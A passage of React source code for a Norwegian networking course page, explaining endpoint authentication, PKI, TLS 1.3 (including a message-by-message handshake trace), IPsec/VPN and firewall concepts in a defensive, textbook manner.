          <li>SHA-256 hashes denne teksten — du får et 256-bits fingeravtrykk.</li>
          <li>Din private GPG-nøkkel signerer fingeravtrykket.</li>
          <li>Signaturen legges ved commiten og pushes til serveren.</li>
        </ol>
        <p className="mt-2">
          Hvem som helst med din offentlige GPG-nøkkel kan etterpå verifisere at akkurat den
          commiten er fra deg, og at ingen har endret den siden du signerte. Selv om noen får
          skrive-tilgang til git-repoet, kan de ikke forfalske signerte commits uten din private
          nøkkel.
        </p>
      </Example>

      <RelatedSlugs slugs={["dte2507-fra-checksum-til-hmac"]} />
    </article>
  );
}

// ============================================================
// 8.4 — Autentisering
// ============================================================
function Section84() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.4" title="Endepunkts-autentisering" />

      <p className="text-muted-foreground">
        Hvordan kan Bob være sikker på at han faktisk snakker med Alice — og ikke med Trudy som
        later som hun er Alice? Vi bygger opp fra naive forsøk og forklarer hvorfor hvert av dem
        feiler, før vi lander på sertifikatbasert autentisering.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "Forsøk 1: «Det er meg, Alice»",
              body: "Alice sender bare en tekst. Trudy kan trivielt sende samme tekst — ingen bevis. Mislykket.",
            },
            {
              term: "Forsøk 2: passord",
              body: "Alice sender navn og passord. Hvis lenken er ukryptert kan Trudy snappe opp passordet og spille det av selv. Mislykket mot en passiv tjuvlytter.",
            },
            {
              term: "Nonce",
              body: "Et tilfeldig tall (nummer used once) som bare brukes i én sesjon. Mottakeren sender en nonce og krever at avsender beviser at hun ser den ved å gjøre noe med den — typisk ved å kryptere eller signere den. Forhindrer replay-angrep fordi gamle svar ikke matcher den nye nonce-en.",
            },
            {
              term: "Challenge-response",
              body: "Mønster der Bob sender en utfordring (typisk en nonce), og Alice svarer med en funksjon av utfordringen og en hemmelighet bare hun har. Hvis hemmeligheten er en delt symmetrisk nøkkel: svaret er MAC(K, nonce). Hvis det er Alices private nøkkel: svaret er sign(privA, nonce).",
            },
            {
              term: "Man-in-the-middle",
              body: "Trudy plasserer seg mellom Alice og Bob. Hun kjører to parallelle handshakes — én med hver. Begge tror de snakker med den andre, men alt går gjennom Trudy. Forsvares ved at en av partene har et forhåndsetablert anker (sertifikat eller forhåndsdelt nøkkel) som binder identitet til offentlig nøkkel.",
            },
            {
              term: "Digitalt sertifikat",
              body: "En signert binding av (identitet, offentlig nøkkel). Utstedes av en betrodd Certificate Authority (CA). Bob ser et sertifikat som sier «Alice sin offentlige nøkkel er pubA», signert av CA-en han allerede stoler på. Han trenger ikke ha møtt Alice — han trenger bare å stole på CA-en.",
            },
            {
              term: "PKI (Public Key Infrastructure)",
              body: "Hele systemet av CA-er, sertifikater, revoke-lister, og rot-nøkler som er bygd inn i operativsystem og nettlesere. Når du går til vg.no leveres et sertifikat utstedt av en CA hvis rot-sertifikat allerede er i Chromes trust store fra fabrikken. Tillit er transitiv: jeg stoler på CA, CA stoler på vg.no.",
            },
            {
              term: "Revoke og OCSP",
              body: "Hvis en privat nøkkel kompromitteres må sertifikatet trekkes tilbake før det utløper. CRL-er (lange ja/nei-lister) og OCSP (online sjekk per sertifikat) er to mekanismer for dette. I praksis bruker moderne nettlesere OCSP-stapling — serveren leverer selv et nylig OCSP-svar sammen med sertifikatet.",
            },
            {
              term: "X.509-sertifikat-felter",
              body: "Standard-felter: Subject (hvem sertifikatet hører til, f.eks. CN=vg.no), Issuer (CA-en som signerte), Validity (NotBefore/NotAfter), Public Key (algoritme + nøkkelmateriale), Serial Number (unikt per CA), Signature Algorithm, og en stor blokk Extensions. SAN (Subject Alternative Names) er der ekte domener for HTTPS legges i dag — CN brukes ikke lenger til validering.",
            },
            {
              term: "Sertifikat-utvidelser (Extensions)",
              body: "Bærer den meste av semantikken i moderne X.509: KeyUsage (signering / kryptering / nøkkel-utveksling), ExtendedKeyUsage (server-auth, klient-auth, code-signing), BasicConstraints (CA: true/false), CRLDistributionPoints, AuthorityInfoAccess (peker til OCSP). En misforstått KeyUsage er klassisk feilkonfigurasjon.",
            },
            {
              term: "Domain Validation (DV) vs Organization (OV) vs Extended (EV)",
              body: "DV: CA verifiserer bare at søker kontrollerer domenet (typisk ACME-challenge med Let's Encrypt). OV: CA verifiserer også organisasjonens identitet manuelt. EV: enda strengere prosess. Nettlesere viser ikke lenger EV-bannere; for vanlige brukere er forskjellen i praksis blitt usynlig.",
            },
            {
              term: "Sertifikat-piping og chain-of-trust",
              body: "En server sender ikke bare sitt eget sertifikat men også de mellomliggende CA-ene helt opp til (men ikke inkludert) en rot CA som klienten har lokalt. Klienten verifiserer hver signatur i kjeden. Feiler om et mellomledd mangler — vanlig konfigurasjons-feil.",
            },
            {
              term: "CRL (Certificate Revocation List)",
              body: "Stor liste utstedt av CA som inneholder serienumrene til alle tilbaketrukne sertifikater i dens domene. Lastes ned periodisk av klienter. Skalerer dårlig (kan bli mange MB) og er ofte utdatert. Erstattes gradvis av OCSP og kortere-levetid-sertifikater.",
            },
            {
              term: "OCSP-stapling og MustStaple",
              body: "OCSP-stapling lar server selv hente et signert OCSP-svar fra CA og levere det sammen med sertifikatet i TLS-handshake. Sparer klient en runde til CA. MustStaple-utvidelsen i sertifikatet sier: «hvis serveren ikke leverer stapled OCSP, ikke stol på den» — gir mye sterkere revoke-garantier.",
            },
            {
              term: "Certificate Transparency (CT)",
              body: "Offentlige, append-only-logger der alle nyutstedte sertifikater må publiseres. Hvis en CA utsteder et falskt sertifikat for vg.no, vil VG kunne oppdage det ved å overvåke CT-logger. Moderne nettlesere krever at sertifikater er i minst to CT-logger.",
            },
            {
              term: "Mutual TLS (mTLS)",
              body: "Begge parter presenterer sertifikat — ikke bare serveren. Brukes i service-mesh (Istio, Linkerd) og mellom interne tjenester. Klient-sertifikatet bærer både identitet og autorisasjon. Mye sterkere enn passord/API-nøkler fordi privat nøkkel aldri sendes.",
            },
            {
              term: "Multi-factor authentication (MFA)",
              body: "Bevis bestående av minst to av: noe du vet (passord), noe du har (telefon med TOTP / sikkerhetsnøkkel), noe du er (biometri). SMS-koder regnes som svak MFA pga. SIM-swap; TOTP (Google Authenticator) er bedre; FIDO2/WebAuthn med hardware-nøkkel er sterkest.",
            },
          ]}
        />
        <Illustration caption="Challenge-response med signatur. Bob velger en fersk nonce; Alice beviser identitet ved å signere den.">
          <ChallengeResponseSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor må nonce være tilfeldig og ikke bare øke monotont?">
        <p>
          En teller (1, 2, 3, ...) ville stoppet replay-angrep der angriper sender samme melding to
          ganger, men ikke <em>refleksjons-angrep</em>. Anta Alice og Bob bruker delt nøkkel og en
          teller. Trudy åpner to parallelle sesjoner mot Bob, samtidig som «klient» og «server», og
          krysser meldingene: når Bob ber om challenge i den ene sesjonen, sender Trudy den videre
          som sin egen challenge i den andre. Bob ender opp med å svare på sin egen utfordring og
          tror Trudy er Alice.
        </p>
        <p>
          En tilfeldig nonce (128+ bit fra kryptografisk PRNG) gjør dette praktisk umulig — sjansen
          for at to parallelle sesjoner får samme nonce er forsvinnende liten, og en angriper kan
          ikke forutsi neste verdi for å sette opp angrepet. Derfor sier TLS-spesifikasjonen
          eksplisitt at både client_random og server_random skal være 32 byte fra en CSPRNG.
        </p>
      </Hvorfor>

      <Illustration caption="Tillits-kjede: rot-CA → mellom-CA → server-sertifikat. Nettleseren har rot-CA i trust store fra fabrikken.">
        <PkiSvg />
      </Illustration>

      <Example title="Eksempel: hvorfor en nonce må være fersk">
        <p>
          Tenk Alice og Bob bruker passordet «p123» direkte i en challenge: Bob sender en nonce N;
          Alice svarer h(p123 || N). Hvis Trudy klarer å få Bob til å gjenbruke samme N senere, kan
          hun spille av Alices gamle svar. Derfor må N være tilfeldig og aldri gjenbrukes — typisk
          minst 128 bit fra en kryptografisk PRNG.
        </p>
        <p className="mt-2 text-muted-foreground">
          Dette er også grunnen til at TLS-handshake har eksplisitte «client random» og «server
          random» felter på 32 byte hver.
        </p>
      </Example>

      <RelatedSlugs slugs={["nettverkssikkerhet"]} />
    </article>
  );
}

// ============================================================
// 8.5 — TLS
// ============================================================
function Section85() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.5" title="TLS — sikker transport for alt" />

      <p className="text-muted-foreground">
        TLS er det praktiske resultatet av kapittelets første halvdel. Den kombinerer asymmetrisk
        autentisering (sertifikater), nøkkelutveksling (DH), symmetrisk kryptering (AES-GCM), og MAC
        i én protokoll som ligger rett over TCP. Når du ser hengelåsen i nettleseren, er det TLS du
        ser.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "TLS-record",
              body: "Etter handshake snakker partene i TLS-records: en liten header som angir type og lengde, så en kryptert+autentisert payload. Hver record er uavhengig kryptert, så en angriper kan ikke kutte ut eller flytte rundt records.",
            },
            {
              term: "Handshake-faser",
              body: "(1) Hilse — klient og server utveksler nonces og hva slags algoritmer de støtter. (2) Server-autentisering — server sender sertifikat. (3) Nøkkelutveksling — typisk ECDHE for forward secrecy. (4) Bekreftelse — begge sjekker at handshake-en ikke har blitt tuklet med, så starter de å sende kryptert data.",
            },
            {
              term: "Cipher suite",
              body: "Pakke av valgte algoritmer som forhandles frem i hilse-fasen. Eks: TLS_AES_128_GCM_SHA256 betyr AES-128 i GCM-modus og SHA-256 for HKDF. TLS 1.3 ryddet kraftig — det er nå et lite, sikkert sett av suites igjen.",
            },
            {
              term: "Forward Secrecy (FS)",
              body: "Egenskap der kompromittering av en server-nøkkel i ettertid ikke avslører gamle sesjoner. Oppnås ved at sesjons-nøkkelen avtales via en éphemeral DH (ECDHE) og kastes når sesjonen er over. TLS 1.3 dropper RSA-key-exchange nettopp fordi det ikke gir FS — server-nøkkel kompromittert = alle gamle sesjoner kan dekrypteres.",
            },
            {
              term: "Master secret og avledede nøkler",
              body: "DH-en gir et felles tilfeldig tall (pre-master). Det blandes med begge nonces gjennom HKDF og produserer mange separate nøkler — én for hver retning av trafikken og én for MAC. Hver retning har sin egen nøkkel og IV-teller, så replay og refleksjon ikke fungerer.",
            },
            {
              term: "Session resumption",
              body: "TLS-handshake koster en eller to RTT-er. For å unngå dette ved gjenoppkobling kan klienten ta vare på en sesjons-billett (session ticket) eller en PSK (pre-shared key). Neste gang sender den en short-circuit handshake basert på den, og 1-RTT (eller 0-RTT) er nok. Lagrer ofte bare 24 timer.",
            },
            {
              term: "TLS 1.3 forenkling",
              body: "Versjonen fjernet en haug arvet bagasje: ingen RSA-key-exchange, ingen statisk DH, ingen MAC-then-encrypt, ingen renforhandling. Bare AEAD-ciphers (GCM, ChaCha20-Poly1305). Handshake gikk fra 2-RTT til 1-RTT. Resultatet er enklere, raskere og tryggere.",
            },
            {
              term: "ClientHello og SNI (Server Name Indication)",
              body: "Første pakke fra klient. Inneholder støttede versjoner, cipher suites, supported groups (kurver for DH), key shares, og kritisk: SNI — hvilket domene klienten vil snakke med. SNI gjør at én IP kan vertere mange HTTPS-domener fordi serveren ser navnet før den velger sertifikat. ECH (Encrypted Client Hello) krypterer også SNI.",
            },
            {
              term: "ServerHello og cipher-valg",
              body: "Server svarer med valgt versjon, cipher suite, sin DH-andel og sitt sertifikat. I TLS 1.3 er sertifikat-meldingen kryptert med handshake-nøkkel — angriper kan ikke se hvilket sertifikat serveren bruker.",
            },
            {
              term: "Finished-melding",
              body: "Siste handshake-melding fra hver side. Inneholder en MAC over hele handshake-transkripsjonen (alt som er sendt så langt) med en nøkkel avledet fra handshake. Hvis en angriper har manipulert et tidligere felt (downgrade-angrep), matcher ikke MAC-en og handshake feiler.",
            },
            {
              term: "0-RTT (Zero Round-Trip Time)",
              body: "TLS 1.3-tillegg: klient som har en gyldig PSK fra tidligere sesjon kan sende kryptert applikasjons-data sammen med ClientHello, før server har svart. Sparer en RTT. Pris: 0-RTT-data har ikke forward secrecy mot den ene PSK-en, og er sårbar for replay — derfor kun for idempotente operasjoner.",
            },
            {
              term: "HKDF og nøkkel-avledning",
              body: "TLS 1.3 bruker HKDF (HMAC-based Key Derivation Function) til å avlede et helt tre av nøkler fra DH-shared-secret + handshake-transkript: handshake_traffic_secret, application_traffic_secret, exporter_secret, resumption_master_secret. Hver tjener et eget formål og er bundet til transkriptet.",
            },
            {
              term: "Downgrade-angrep og TLS_FALLBACK_SCSV",
              body: "Angriper avbryter TLS-handshake og lurer klienten til å prøve igjen med eldre, svakere versjon (TLS 1.0 / SSL 3.0). POODLE-angrepet utnyttet dette. Forsvar: TLS_FALLBACK_SCSV signaliserer at klienten har fallback-et, og serveren avviser hvis den støtter høyere versjon.",
            },
            {
              term: "QUIC og TLS 1.3",
              body: "QUIC (under HTTP/3) integrerer TLS 1.3 direkte i transport-laget over UDP. Handshake skjer parallelt med transport-oppsett, så 1-RTT etablerer både transport og kryptering. Forhindrer hele klasser av middlebox-interferens fordi UDP-payload er helt kryptert.",
            },
            {
              term: "Cipher suite-notasjon i TLS 1.3 vs 1.2",
              body: "TLS 1.2: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (key-exchange + auth + cipher + MAC, alt i navnet). TLS 1.3: kun TLS_AES_128_GCM_SHA256 — key-exchange og signatur forhandles separat via supported_groups og signature_algorithms-utvidelser. Mye renere.",
            },
            {
              term: "ALPN (Application-Layer Protocol Negotiation)",
              body: "TLS-utvidelse der klient og server forhandler applikasjons-protokoll under handshake (h2 for HTTP/2, http/1.1 for klassisk, h3 for QUIC). Sparer en ekstra runde og lar én port kjøre flere protokoller. Brukes også av WebSocket-oppgradering og gRPC.",
            },
          ]}
        />
        <Illustration caption="TLS 1.3 handshake — én RTT før applikasjons-data kan sendes. ServerHello inneholder sertifikat og DH-andel.">
          <TlsHandshakeSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor dropper TLS 1.3 RSA-key-exchange?">
        <p>
          I gammel RSA-key-exchange genererte klienten et pre-master secret og krypterte det med
          serverens offentlige RSA-nøkkel. Server dekrypterte med sin private nøkkel. Det fungerer —
          men gir <em>ingen forward secrecy</em>: hele sesjonens sikkerhet avhenger av at serverens
          langlivede private nøkkel aldri lekker. En angriper som logger ciphertext-trafikk i fem år
          og deretter — via et innbrudd, en hjemmel, en utpressing — får tak i den private nøkkelen,
          kan dekryptere alle de fem årene med kommunikasjon.
        </p>
        <p>
          (EC)DHE løser dette ved at hver part lager et ferskt, kortlivd DH-nøkkelpar bare for den
          ene handshaken. Det delte hemmeligheten utledes av disse éphemeral-nøklene, og de blir
          slettet umiddelbart etterpå. Serverens langlivede nøkkel brukes bare til å signere
          DH-andel (autentisering), ikke til selve nøkkelutvekslingen. Lekkasje i ettertid lar
          angriper falske fremtidige handshakes, men gamle sesjoner forblir trygge. TLS 1.3 gjør
          derfor (EC)DHE obligatorisk og fjerner RSA-key-exchange helt.
        </p>
      </Hvorfor>

      <Example title="Eksempel: regn ut hva som er trygt etter at server-nøkkelen lekker">
        <p>
          Anta at Trudy har samlet et halvt år med kryptert trafikk mot en bank, og en dag stjeler
          hun bankens private RSA-nøkkel.
        </p>
        <ul className="list-disc pl-5 mt-1">
          <li>
            <strong>TLS 1.2 med RSA-key-exchange:</strong> klient krypterte pre-master med bankens
            offentlige nøkkel. Trudy kan nå dekryptere pre-master fra alle gamle handshakes →
            dekryptere all gammel trafikk. Katastrofe.
          </li>
          <li>
            <strong>TLS 1.3 (eller TLS 1.2 med ECDHE):</strong> pre-master kom fra en éphemeral
            DH-utveksling som ble kastet rett etter handshake. Bankens private nøkkel ble bare brukt
            til å signere ECDHE-andelen. Trudy kan ikke utlede pre-master fra de offentlige
            DH-verdiene hun har samlet. Gamle sesjoner er trygge.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Dette er hvorfor Forward Secrecy er obligatorisk i TLS 1.3.
        </p>
      </Example>

      <Example title="Eksempel: TLS 1.3 handshake-trace, melding for melding">
        <p>
          La oss følge en typisk handshake mellom en nettleser og banken
          <code> sparebank.example.no</code>:
        </p>
        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`Klient ─────────────────────────────────────────────── Server
   ClientHello {
     versions:   [TLS 1.3, TLS 1.2]
     cipher_suites: [TLS_AES_128_GCM_SHA256, ...]
     supported_groups: [x25519, secp256r1]
     key_share:   x25519 = (klient_pub)
     SNI:         sparebank.example.no
     client_random: 32 bytes (CSPRNG)
   }                                       ────────────►

                                           ◄────────────  ServerHello {
                                              version:    TLS 1.3
                                              cipher:     TLS_AES_128_GCM_SHA256
                                              key_share:  x25519 = (server_pub)
                                              server_random: 32 bytes
                                           }
                                           ── { handshake_secret avledes på begge sider } ──
                                                          {Certificate, sertifikat-kjede}
                                                          {CertificateVerify, signatur over transkript}
                                                          {Finished, MAC over transkript}
   {verifiserer sertifikat-kjede}
   {verifiserer CertificateVerify mot pubkey i sertifikatet}
   {verifiserer Finished-MAC}
   {Finished, MAC over transkript}        ────────────►

   ── { application_traffic_secret avledes; tunnel åpen } ──
   {GET / HTTP/1.1, Host: sparebank.example.no}  ───────►
                                           ◄────────────  {HTTP/1.1 200 OK, ...}`}
        </pre>
        <p className="mt-2 text-muted-foreground">
          Merk at sertifikatet sendes ETTER ServerHello og er kryptert med handshake_traffic_secret
          — det betyr at en passiv observatør ikke ser hvilken server klienten autentiserer. Bare
          SNI (i ClientHello) avslører servernavnet, og ECH gjør også det skjult.
        </p>
      </Example>

      <RelatedSlugs slugs={["tls", "dte2507-tls-handshake", "dte2507-tls-handshake-lab"]} />
    </article>
  );
}

// ============================================================
// 8.6 — IPsec & VPN
// ============================================================
function Section86() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.6" title="IPsec og VPN" />

      <p className="text-muted-foreground">
        TLS sikrer applikasjons-laget — du må programmere det inn i hver app. IPsec sikrer
        nettverks-laget — alle pakker mellom to noder kan beskyttes uten at applikasjonen vet om
        det. Det er ryggraden i bedrifts-VPN-er og i site-to-site-tunneler mellom kontorer.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "AH (Authentication Header)",
              body: "IPsec-protokoll som gir integritet og autentisering, men IKKE konfidensialitet. AH-headeren inneholder en HMAC over hele pakken inkludert (de fleste) IP-felter. Brukes sjelden alene i dag — folk vil nesten alltid også ha kryptering.",
            },
            {
              term: "ESP (Encapsulating Security Payload)",
              body: "IPsec-protokoll som gir konfidensialitet pluss integritet. Payload krypteres (typisk AES-CBC eller AES-GCM), og en MAC dekker den krypterte payload-en. ESP er det vanlige valget i moderne deployments.",
            },
            {
              term: "Transport-mode",
              body: "Den originale IP-headeren beholdes; bare payload-en (TCP/UDP-data) krypteres og legges innenfor en ESP-konvolutt. Brukes mellom to enkelt-hosts som vil snakke trygt direkte. Sparer plass siden det ikke trengs ekstra IP-header.",
            },
            {
              term: "Tunnel-mode",
              body: "Hele den originale IP-pakken krypteres og pakkes inn som payload i en helt ny IP-pakke med ny header. Vanlig mellom to VPN-gateways: kontoret i Tromsø og kontoret i Bergen har én tunnel; alle pakker fra Tromsø-LAN-et pakkes inn, sendes over internett kryptert, og pakkes ut i Bergen.",
            },
            {
              term: "SA (Security Association)",
              body: "Enveis avtale mellom to noder om en spesifikk sikkerhetsprofil: hvilken protokoll (AH/ESP), modus, krypterings- og autentiserings-nøkler, og en SPI (Security Parameters Index) som identifiserer SA-en. To-veis kommunikasjon krever to SA-er, én i hver retning.",
            },
            {
              term: "IKE (Internet Key Exchange)",
              body: "Protokollen som forhandler frem SA-er og avtaler nøkler. Versjon 2 er standard i dag. Bruker DH for nøkkelutveksling, sertifikater eller PSK for autentisering. Resultatet er at begge sider har samme symmetriske nøkler uten at de noen gang er sendt åpent.",
            },
            {
              term: "Anti-replay-vindu",
              body: "Hver pakke i en SA har et 32-bits sekvensnummer. Mottaker holder et glidende vindu (typisk 64 pakker) og avviser pakker som er for gamle eller allerede sett. Stopper en angriper fra å samle gamle pakker og spille dem av senere.",
            },
            {
              term: "SPI (Security Parameters Index)",
              body: "32-bits identifikator i ESP/AH-headeren. Mottaker bruker (dst-IP, SPI, protokoll) som nøkkel til å slå opp riktig SA i sin SAD (Security Association Database) og dermed riktige krypto-nøkler. Velges av mottaker når SA opprettes via IKE.",
            },
            {
              term: "SAD og SPD",
              body: "SAD (Security Association Database): tabell over aktive SA-er — én rad per retning, indeksert på SPI. SPD (Security Policy Database): regel-tabell som sier hvilken trafikk som skal beskyttes (protect), slippes gjennom klart (bypass), eller forkastes (discard). SPD-en konfigureres av admin; SAD-en fylles ut av IKE.",
            },
            {
              term: "IKEv2-faser",
              body: "Fase 1 (IKE_SA_INIT): forhandler IKE-SA selv — DH-utveksling + algoritmer, åpner en sikker kanal for resten av IKE. Fase 2 (IKE_AUTH): autentiserer parter (sertifikat eller PSK) og oppretter første barne-SA for trafikk. CREATE_CHILD_SA-utvekslinger oppretter senere SA-er eller roterer nøkler.",
            },
            {
              term: "PFS (Perfect Forward Secrecy) i IPsec",
              body: "Hver ny barne-SA gjør sin egen ferske DH-utveksling i stedet for å avlede nøkler fra IKE-SA-ens master. Hvis IKE-master-nøkkelen lekker, er fortsatt eldre barne-SA-trafikk trygg. Anbefales på i moderne deployments.",
            },
            {
              term: "NAT-traversal (NAT-T) og UDP-encapsulation",
              body: "ESP er protokoll 50 — NAT-bokser klarer ikke å rute den fordi det ikke er TCP/UDP-porter å spore. Løsningen er å pakke ESP inn i UDP port 4500. IKEv2 detekterer NAT under handshake via NAT_DETECTION-payloads og bytter automatisk til UDP-encapsulation.",
            },
            {
              term: "WireGuard som moderne alternativ",
              body: "Ny VPN-protokoll som droppet IPsec-kompleksiteten. Bare én cipher suite (ChaCha20-Poly1305 + Curve25519 + BLAKE2s + SipHash), fast 4-byte header, ingen forhandling. ~4000 linjer kode mot IPsec sine ~400 000. Kjøres i kjernen, ekstremt rask, og enkel å auditere.",
            },
            {
              term: "Site-to-site vs remote-access VPN",
              body: "Site-to-site: tunnel mellom to faste gateways (kontorer). Remote-access: en bruker med klient-programvare kobler seg til en VPN-konsentrator (hjemmekontor). De bruker samme underliggende protokoller (IPsec, OpenVPN, WireGuard) men med ulik klient-tilstand.",
            },
            {
              term: "Split-tunneling vs full-tunneling",
              body: "Full-tunneling: ALL trafikk fra klienten går gjennom VPN. Sikkert men treigt og overdrevet for vanlig web-surf. Split-tunneling: bare trafikk til bedriftsadresser går i tunnelen, resten direkte. Bedre ytelse, men eksponerer klient-maskinen for hjemmenettet hvis det er kompromittert.",
            },
            {
              term: "Hva IPsec ikke gir",
              body: "Tilgang til applikasjons-laget (kan ikke filtrere på HTTP-URL eller blokkere XSS), ingen bruker-til-bruker-autentisering (bare endepunkt-til-endepunkt), og ingen forsvar mot insider på samme LAN som har tilgang til den dekrypterte enden. IPsec er transport-sikkerhet, ikke et helhetlig forsvar.",
            },
          ]}
        />
        <Illustration caption="Tunnel-mode: hele original-pakken pakkes inn i en ny IP+ESP-pakke. De interne adressene er skjult.">
          <IpsecTunnelSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor velger man tunnel-mode mellom kontorer, men transport-mode for host-til-host?">
        <p>
          Forskjellen handler om hva slags adressering som finnes på endepunktene. To kontor-LAN-er
          har private adresser (10.x eller 192.168.x) som ikke kan rutes over internett. Hvis vi
          bare krypterte payload-en og lot interne adresser stå i header (transport-mode), ville
          mellomliggende rutere nektet å videresende pakken — de vet ikke hvor 10.0.2.7 ligger.
          Tunnel-mode kapsler hele pakken inn i en ny ytre IP-header med de offentlige
          gateway-adressene, så internett ser bare gateway-til-gateway-trafikk.
        </p>
        <p>
          For to enkelt-hosts som allerede har offentlige, rutbare adresser (eks. to servere som vil
          snakke trygt direkte) er det ingen grunn til å bære byrden av en ekstra IP-header på 20
          byte per pakke. Transport-mode beholder den originale headeren og krypterer bare payload,
          og er dermed mer effektivt. Som regel: hvis endepunktene snakker sammen via gateways som
          beskytter andre, bruk tunnel; hvis de snakker direkte, bruk transport.
        </p>
      </Hvorfor>

      <Example title="Eksempel: når bør du velge tunnel-mode?">
        <p>
          Et selskap har et hovedkontor i Oslo og en filial i Bodø. De vil at interne IP-er
          (10.0.0.0/16) skal være rutbar mellom kontorene.
        </p>
        <ul className="list-disc pl-5 mt-1">
          <li>En IPsec-tunnel etableres mellom de to gateway-ene (deres offentlige IP-er).</li>
          <li>
            En arbeidsstasjon 10.0.1.5 i Oslo pinger 10.0.2.7 i Bodø. Pakken ankommer
            Oslo-gateway-en med interne adresser i headeren.
          </li>
          <li>
            Gateway-en krypterer hele pakken (inkludert interne adresser), pakker den i en ny
            IP-pakke med offentlige source/dest, og sender den over internett.
          </li>
          <li>
            Bodø-gateway-en mottar, dekrypterer, og leverer originalpakken videre inn i 10.0.2.0/24.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Underveis ser internett bare gateway-til-gateway-trafikk. Selv hvilke interne maskiner som
          snakker sammen er skjult.
        </p>
      </Example>

      <RelatedSlugs slugs={["nettverkssikkerhet"]} />
    </article>
  );
}

// ============================================================
// 8.7 — Brannmurer
// ============================================================
function Section87() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.7" title="Brannmurer — hvem som slipper inn" />

      <p className="text-muted-foreground">
        En brannmur sitter på en pakkes vei og bestemmer hvilke pakker som får passere. Den er det
        første forsvars-laget mellom et internt nett og internett. Det finnes flere generasjoner —
        stateless, stateful, og applikasjons-bevisst — med ulike trade-offs.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "Stateless pakkefilter",
              body: "Ser på hver pakke for seg uten å huske noe fra før. Regelsett er en ordnet liste av (kilde, dest, port, protokoll, handling). Ekstremt rask og enkel, men kan ikke skille mellom «svar på en utgående forespørsel» og «uoppfordret innkommende pakke» — du må enten åpne portene for alltid eller stenge dem helt.",
            },
            {
              term: "Stateful inspeksjon",
              body: "Holder en tabell over aktive forbindelser. Når en intern host åpner TCP til en ekstern server (SYN ut), legges (src-IP, src-port, dst-IP, dst-port) inn i tabellen. Innkommende pakker matches mot tabellen; svar slippes inn, uoppfordrede pakker avvises. Default-policy kan dermed være «deny all incoming», men interne kan fortsatt åpne forbindelser ut.",
            },
            {
              term: "Default deny",
              body: "Beste-praksis-policy: alt som ikke eksplisitt er tillatt, blir avvist. Motsatt av «default allow» som krever at man tenker på alle mulige angrep — umulig. Med default deny gir man bare positive eksempler («tillat TCP/443 ut»).",
            },
            {
              term: "Implicit deny ved slutten av regelsettet",
              body: "Regler evalueres top-down, første match vinner. Helt nederst legges en eksplisitt «deny all» — slik at en pakke som ikke matchet noen regel ovenfor, fanges der i stedet for å slippe gjennom ved et uhell.",
            },
            {
              term: "Applikasjons-brannmur (proxy)",
              body: "Forstår innholdet i applikasjons-protokoller. En HTTP-proxy kan blokkere POST-er med bestemte mønstre eller cookies; en SMTP-proxy kan strippe ut farlige vedlegg. Mye dyrere per pakke enn pakkefilter, men kan stoppe ting et lavnivå-filter ikke ser.",
            },
            {
              term: "Tunneling og smugling",
              body: "Hvis brannmuren bare ser på port-nummer, kan angripere skjule trafikk i tillatte protokoller. SSH over port 443, eller en hel TCP-forbindelse inn i HTTPS via WebSocket. Forsvar: dyp pakke-inspeksjon eller TLS-terminering på en intern proxy som kan se trafikken etter dekryptering.",
            },
            {
              term: "Egress-filtrering",
              body: "Filtrering også av utgående trafikk. Mange organisasjoner glemmer dette og fokuserer bare på innkommende. Egress-regler stopper malware fra å eksfiltrere data eller koble seg til kommando-servere. Også god praksis: blokker utgående SMTP fra alt unntatt e-postserveren.",
            },
            {
              term: "Stateless vs stateful (forskjellen)",
              body: "Stateless: regelsett uten hukommelse, hver pakke vurderes for seg. Krever at man åpner svar-portene (eks. høye tilfeldige porter 1024+) for innkommende. Stateful: ser TCP-handshake (SYN/SYN-ACK/ACK) og UDP-«flow» og legger til ephemeral-regler for svar automatisk. Stateful er standard i alt fra hjemmerutere til enterprise.",
            },
            {
              term: "Connection-tracking-tabell",
              body: "Datastrukturen som driver stateful inspeksjon. En rad per aktiv flow: (proto, src-IP, src-port, dst-IP, dst-port, tilstand, timer). TCP-flows beholdes til FIN/RST eller idle-timeout (timer); UDP «flows» eksisterer bare som idle-timer (typisk 30 s). Stor tabell tar mye minne — DoS-angrep kan fylle den opp.",
            },
            {
              term: "Next-Generation Firewall (NGFW)",
              body: "Kombinasjon av stateful pakkefilter + applikasjons-identifikasjon + IPS + ofte SSL-inspeksjon. Identifiserer applikasjoner basert på protokoll-signaturer og oppførsel, ikke bare port. Kan f.eks. blokkere Skype-trafikk selv om den prøver å bytte port for å skjule seg.",
            },
            {
              term: "WAF (Web Application Firewall)",
              body: "Spesialisert applikasjons-brannmur for HTTP/HTTPS. Forstår URL-er, parametere, headere, cookies. Inspekterer ofte for OWASP Top 10-mønstre — SQL-injeksjon, XSS, path-traversal. ModSecurity er klassisk open-source WAF; cloud-tjenester som Cloudflare, AWS WAF tilbyr managed varianter.",
            },
            {
              term: "Default deny vs default allow",
              body: "Default deny: alt som ikke eksplisitt er tillatt, blokkeres. Default allow: alt som ikke eksplisitt er blokkert, tillates. Sikkerhets-best-practice er default deny på innkommende. Default allow krever at man kan forutse alle mulige angrep og blokkere hver av dem — umulig.",
            },
            {
              term: "DMZ (Demilitarized Zone)",
              body: "Mellomliggende nettverks-segment for tjenester som må være tilgjengelig fra internett (web, mail, DNS). Brannmur slipper utenfra-trafikk inn i DMZ, men ikke videre inn i interne LAN. Hvis en server i DMZ kompromitteres, må angriperen bryte gjennom andre laget for å nå interne data.",
            },
            {
              term: "Zero-trust og micro-segmentering",
